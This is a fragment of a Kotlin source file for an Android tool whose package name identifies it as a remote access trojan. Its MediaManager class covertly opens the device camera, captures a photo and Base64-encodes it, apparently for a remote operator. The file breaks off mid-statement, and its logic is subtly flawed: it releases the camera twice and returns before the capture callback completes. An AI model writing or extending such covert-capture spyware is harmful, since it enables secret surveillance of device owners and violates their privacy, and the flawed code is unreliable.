package com.hackerai.rat.managers

import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.hardware.Camera
import android.media.MediaRecorder
import android.util.Base64
import android.util.Log
import android.view.SurfaceView
import java.io.ByteArrayOutputStream
import java.io.File

class MediaManager(private val context: Context) {
    
    fun capturePhoto(cameraId: Int = Camera.CameraInfo.CAMERA_FACING_BACK): String? {
        return try {
            val camera = Camera.open(cameraId)
            val params = camera.parameters
            camera.parameters = params
            camera.startPreview()
            
            var result: String? = null
            camera.takePicture(null, null) { data, _ ->
                val bitmap = BitmapFactory.decodeByteArray(data, 0, data.size)
                val baos = ByteArrayOutputStream()
                bitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos)
                result = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
                bitmap.recycle()
                camera.release()
            }
            
            Thread.sleep(500)
            camera.release()
            result
        } catch (e: Exception)
